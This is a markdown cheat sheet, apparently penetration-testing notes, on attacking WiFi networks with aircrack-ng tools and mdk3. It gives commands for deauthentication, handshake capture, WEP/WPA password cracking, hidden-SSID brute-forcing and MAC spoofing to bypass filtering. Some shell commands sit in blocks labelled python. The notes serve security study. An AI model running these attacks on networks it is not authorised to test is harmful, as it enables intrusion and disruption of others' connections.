# Attacking WiFi Networks

### Monitor Mode

```shell
# Get names of all available interfaces
sudo airmon-ng
# Start montior mode on interface
sudo airmon-ng start wlan0
# Start montior mode on specific channel
sudo airmon-ng start wlan0 11

# Checking for interfering processes
# We can kill them to avoid any issues
sudo airmon-ng check
sudo airmon-ng check kill

# Stopping monitor mode
sudo airmon-ng stop wlan0mon
```

### Capture Traffic

```shell
# Scanning networks
sudo airodump-ng wlan0mon
# Scanning Specific Channels or a Single Channel
sudo airodump-ng -c 11 wlan0mon

# Scanning different bands
# a uses 5 GHz
# b uses 2.4 GHz
# g uses 2.4 GHz
sudo airodump-ng wlan0mon --band a
# Scanning all bands
sudo airodump-ng --band abg wlan0mon

# Write to a file
--write filename
# Save only the captured IVs (Initialization Vectors)
--ivs
```

### Create Graphs

- **Clients to AP Relationship Graph:** Illustrates the connections between wireless clients and Access Points.

- **Clients Probe Graph:** Showcases the probed networks by wireless clients. A visual depiction of the networks 
scanned and potentially accessed by these devices.

```python
# Clients to AP Relationship Graph
sudo airgraph-ng -i traffic.csv -g CAPR -o CAPR.png

# Clients Probe Graph
sudo airgraph-ng -i traffic.csv -g CPG -o CPG.png
```

### Attacking using Aireplay-ng

- Check for codes of different attack modes supported by aireplay-ng

```python
# Test for packet injection 
# Injection is working! This indicates that our
# interface supports packet injection
sudo aireplay-ng --test wlan0mon

# Perform Deauthentication attack
# number_of_deauths=0 means send continuously
sudo aireplay-ng --deauth <number_of_deauths> -a <AP_mac> -c <client_mac> wlan0mon
```

- When we de-authenticate a client, a four-way handshake would be captured by airodump-ng
when client tries to reconnect to the network.


### Decrypting Traffic

- Once we have key to a network, we can decrypt `WEP`, `WPA PSK`, and `WPA2 PSK` captures.
- We can use `Airdecap-ng` to perform following tasks:

    - Removing wireless headers from an open network capture (Unencrypted capture).
    - Decrypting a WEP-encrypted capture file using a hexadecimal WEP key.
    - Decrypting a WPA/WPA2-encrypted capture file using the passphrase.

```python
# An output file with the suffix -dec will be
# generated which we can view in wireshark

# Removing Wireless Headers from Unencrypted 
# Capture file
airdecap-ng -b <bssid> <capture-file>

# Decrypting WEP-encrypted captures
airdecap-ng -w <WEP-key> <capture-file>

# Decrypting WPA-encrypted captures
airdecap-ng -p <passphrase> <capture-file> -e <essid>
```


### Cracking Passwords

- From the above commands of airodump, you must have a pcap file
with a sufficient number of encrypted packets for cracking WEP
or it must have captured a "four-way handshake" for cracking WPA.

```python
# Cracking WEP
aircrack-ng -K traffic.ivs 

# Cracking WPA
aircrack-ng traffic.pcap -w <wordlist>
```

### Finding Hidden SSIDs

- In the airodump-ng result, the ESSID is hidden and it is showing the
length of the name, instead of the actual name.

**Detecting Hidden SSID using Deauth:**
    - De-authenticate a client from its network.
    - After sending the deauthentication requests using aireplay-ng, we will be able to see the
    name of the hidden SSID appear in airodump-ng once the client reconnects to the WiFi network.
    - This process leverages the re-association request, which contains the SSID name, and allows
    us to capture and identify the hidden SSID.

**Bruteforcing Hidden SSID:**
    - We can also use Brute Force attack to get hidden SSID.

    ```python
    # upper case (u)
    # digits (n)
    # all printed (a)
    # lower and upper case (c)
    # lower and upper case plus numbers (m)
    sudo mdk3 wlan0mon p -b u -c 1 -t <target_mac> -f <wordlist>
    ```


### Bypassing MAC Filtering

- MAC filtering involves allowing only devices with specific MAC (Media Access Control) 
addresses to connect to the network.

- This can be bypassed by performing `MAC address spoofing`, where an attacker changes their
device's MAC address to match an allowed device, thereby gaining access to the network.

- This approach often leads to collision events, as two devices with the same MAC address cannot
coexist on the same network simultaneously.

- A more effective method would be to either forcefully disconnect the legitimate client through 
deauthentication attacks, thereby freeing up the MAC address for use, or to wait for the client 
to disconnect naturally. 

- In the case of a dual-band or multiple access point network, we may be able to utilize a MAC 
address of a client connected to a separate access point within the same wireless infrastructure.

```python
# Change MAC address of your interface
sudo ifconfig wlan0 down
sudo macchanger wlan0 -m <new_mac_address>
sudo ifconfig wlan0 up
```